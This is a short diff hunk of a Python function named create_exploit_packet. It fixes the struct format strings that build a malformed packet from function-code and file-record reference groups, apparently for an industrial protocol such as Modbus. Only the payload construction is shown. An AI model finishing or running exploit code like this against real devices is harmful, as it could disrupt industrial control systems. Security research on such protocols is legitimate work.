@@ -22,14 +22,17 @@ def create_exploit_packet():
 
     # Construct payload
     payload = struct.pack('>B', function_code)
-    payload += struct.pack('>BHHHH',
+    
+    # Append first group
+    payload += struct.pack('>BHHH',
                            reference_type_1,
                            file_number_1,
                            record_number_1,
                            record_length_1)
     payload += b'\x00\x00'  # Minimum 2 bytes of data for the first group
     
-    payload += struct.pack('>BHHHH',
+    # Append second group
+    payload += struct.pack('>BHHH',
                            reference_type_2,
                            file_number_2,
                            record_number_2,
